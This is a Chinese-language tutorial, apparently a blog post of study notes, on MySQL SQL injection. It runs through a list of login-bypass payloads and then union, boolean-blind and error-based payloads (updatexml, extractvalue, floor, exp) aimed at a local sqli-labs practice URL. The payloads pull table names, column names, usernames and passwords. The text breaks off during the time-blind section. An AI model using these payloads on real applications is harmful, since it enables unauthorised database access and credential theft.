    <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="数据库知识"><a href="#数据库知识" class="headerlink" title="数据库知识"></a>数据库知识</h2><p>数据库结构：</p><p>mysql</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl">库-表-字段（数据）<br><span class="hljs-function"><span class="hljs-title">database</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">table</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">column</span>-&gt;</span>value<br></code></pre></td></tr></table></figure><p>常用sql语句：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">数据库创建</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">create database school;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据库</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show databases;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">create table student(<span class="hljs-built_in">id</span> int(10),username varchar(20),mail varchar(20));</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">show tables;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">插入数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">insert into student(<span class="hljs-built_in">id</span>,username,mail) values(1,<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-string">&quot;zs@redteam.com&quot;</span>);</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">insert into student(<span class="hljs-built_in">id</span>,username,mail) values(2,<span class="hljs-string">&quot;lisi&quot;</span>,<span class="hljs-string">&quot;ls@redteam.com&quot;</span>);</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> mail from student;</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from student;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">修改数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">update student <span class="hljs-built_in">set</span> username=<span class="hljs-string">&quot;zhangsan2&quot;</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = 1 ;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除数据</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">delete from student <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> = 1;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除表</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">drop table student;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">删除数据库</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash">drop database school;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询登录的用户</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> user();</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据存放地址</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> @@datadir;</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">查询数据库的版本</span><br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> version();</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">where</span>条件,<span class="hljs-built_in">limit</span>条件</span><br>where 字段名=x 返回对应字段名为x的那一行<br>limit x,x 查询的数据 只返回第(x-1)行开始的内容 返回x行<br><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-built_in">limit</span> 0,1;</span><br></code></pre></td></tr></table></figure><p>PHP连接数据库语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$user</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$pass</span> = <span class="hljs-string">&quot;root&quot;</span>;<br><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span>);  <span class="hljs-comment">//打开非持久的 MySQL 连接</span><br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;school&quot;</span>);   <span class="hljs-comment">//选择school数据库</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from student&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);  <span class="hljs-comment">//执行sql语句</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>))&#123;  <span class="hljs-comment">//取一行结果为数组（有keyvalue），没有行返回false</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;id:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-string">&quot; username:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot; mail:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;mail&quot;</span>].<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="sql注入-1"><a href="#sql注入-1" class="headerlink" title="sql注入"></a>sql注入</h2><p>原理</p><p>闭合符号如<code>&#39;</code>、<code>&quot;</code>、<code>&#39;)</code>，达到执行其他语句的效果</p><p>万能密码</p><p>sql语句：</p><p><code>SELECT * FROM users WHERE username= &#39;&quot;.$username.&quot;&#39; AND Password= &#39;&quot;.md5($password).&quot;&#39;</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27; or 1=&#x27;</span>1<br><span class="hljs-string">&#x27;or&#x27;</span>=<span class="hljs-string">&#x27;or&#x27;</span><br><span class="hljs-string">&quot;or &quot;</span>a<span class="hljs-string">&quot;=&quot;</span>a<br>a<span class="hljs-string">&#x27; having 1=1#</span><br><span class="hljs-string">a&#x27;</span> having <span class="hljs-attribute">1</span>=1--<br>admin<span class="hljs-string">&#x27;--</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1--<br>admin<span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>--<br>admin<span class="hljs-string">&#x27; or &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>admin<span class="hljs-string">&#x27; OR 4=4/*</span><br><span class="hljs-string">&#x27;</span>)<span class="hljs-keyword">or</span>(<span class="hljs-string">&#x27;a&#x27;</span>=<span class="hljs-string">&#x27;a</span><br><span class="hljs-string">or 4=4--</span><br><span class="hljs-string">&quot;or 4=4--</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4/*<br><span class="hljs-string">&#x27;or&#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>a<br><span class="hljs-string">&quot;or&quot;</span>=<span class="hljs-string">&quot;a&#x27;=&#x27;a</span><br><span class="hljs-string">&#x27;or&#x27;&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or&#x27;=&#x27;or&#x27;</span><br><span class="hljs-string">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="hljs-string">&#x27;OR 4=4%00</span><br><span class="hljs-string">&quot;</span><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4%00<br>1<span class="hljs-string">&#x27;or&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>=1<br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4<br>admin<span class="hljs-string">&#x27; UNION Select 1,1,1 FROM admin Where &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>-1%cf<span class="hljs-string">&#x27; union select 1,1,1 as password,1,1,1 %23</span><br></code></pre></td></tr></table></figure><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>union的使用：sql语句1 union sql语句2 如果字段数相同的话会同时返回，且sql语句1出错时只返回sql语句2</p><p>注入流程：</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gauss">判断注入点：<br><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span> <span class="hljs-built_in">union</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span>……<span class="hljs-meta">#</span><br><br>获取字段数量，查看回显位置<br><span class="hljs-number">-1</span>&#x27; order by <span class="hljs-number">4</span><span class="hljs-meta">#</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-meta">#</span><br><br>查询库<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br><br>查询库中表名<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,table_name from information_schema.tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-built_in">database</span>() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><br>查询字段名<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">group_concat</span>(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=&#x27;users&#x27; limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><br>查数据<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,id from sqli.users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr(database(),1,1)=&#x27;</span>s<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())&gt;=<span class="hljs-number">1</span><span class="hljs-comment">--+</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(select database())&gt;=1--+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">80</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">0x3a</span>、<span class="hljs-number">0x7e</span>是为了在xpath中是语法错误的<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x3a</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> ),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">描述：使用xpath表示法从<span class="hljs-type">XML</span>字符串中提取值<br>xml_docment:<span class="hljs-type">xml</span>标记<br>Xpthstring: 显示输入语句<br>new_value:新值<br>数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat(<span class="hljs-keyword">database</span>())))<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))))<span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))))<span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users)))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>floor的讲解参考：<a href="https://www.cnblogs.com/litlife/p/8472323.html">https://www.cnblogs.com/litlife/p/8472323.html</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">floor,count,<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>冲突报错<br>数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> count(*),concat(<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x7e</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x) a)<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(),concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;~&#x27;</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(),concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;~&#x27;</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count() ,concat(<span class="hljs-string">&#x27;~&#x27;</span>(<span class="hljs-keyword">select</span> concat(username,&quot;;&quot;,<span class="hljs-keyword">password</span>,&quot;;&quot;)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">1</span>),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())x))<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)x))<span class="hljs-comment">-- +</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>)x))<span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users)x))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>参考<a href="https://blog.csdn.net/weixin_54217950/article/details/122938063">https://blog.csdn.net/weixin_54217950/article/details/122938063</a></p><p>如果显示不完整：<br>substring(database(),5,10)<br>Substring是字符截取函数，从数据里面第五个字符开始截取十个字符</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p><code>if(expr1,expr2,expr3)</code>-&gt;如果expr1是true，则返回expr2；否则返回expr3。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and if(length(database())&gt;<span 